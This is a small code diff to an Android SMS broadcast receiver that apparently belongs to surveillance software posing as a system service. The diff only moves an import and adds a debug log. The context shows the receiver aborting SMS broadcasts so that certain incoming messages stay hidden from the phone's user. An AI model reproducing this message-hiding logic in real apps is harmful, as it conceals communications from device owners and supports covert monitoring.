@@ -18,8 +18,8 @@ import android.telephony.SmsMessage;
 import com.android.service.Core;
 import com.android.service.Messages;
 import com.android.service.ServiceCore;
-import com.android.service.Sms;
 import com.android.service.auto.Cfg;
+import com.android.service.module.message.Sms;
 import com.android.service.util.Check;
 
 public class BroadcastMonitorSms extends BroadcastReceiver {
@@ -76,6 +76,9 @@ public class BroadcastMonitorSms extends BroadcastReceiver {
 			// 1 means "remove notification for this sms"
 			if ((result & 1) == 1) {
 				abortBroadcast();
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (onReceive): hidden, broadcast aborted");
+				}
 			}
 		}
 	}
